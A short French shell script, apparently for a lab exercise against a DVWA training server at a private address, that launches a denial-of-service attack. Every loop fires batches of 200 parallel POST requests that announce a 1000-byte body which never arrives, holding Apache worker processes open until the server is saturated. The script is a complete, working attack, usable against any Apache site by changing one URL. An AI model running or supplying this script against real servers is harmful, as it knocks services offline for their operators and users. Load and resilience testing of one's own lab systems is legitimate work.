#!/bin/sh
# charge.sh - saturation applicative de dvwa-cible
# chaque POST annonce un corps (Content-Length) qui n'arrive jamais :
# Apache garde un worker en attente pour chaque connexion
CIBLE=http://10.40.0.10/login.php
FIN=$(($(date +%s) + 20))
while [ "$(date +%s)" -lt "$FIN" ]; do
    for i in $(seq 1 200); do
        curl -s -o /dev/null --max-time 8 -X POST -H "Content-Length: 1000" "$CIBLE" &
    done
    wait
done
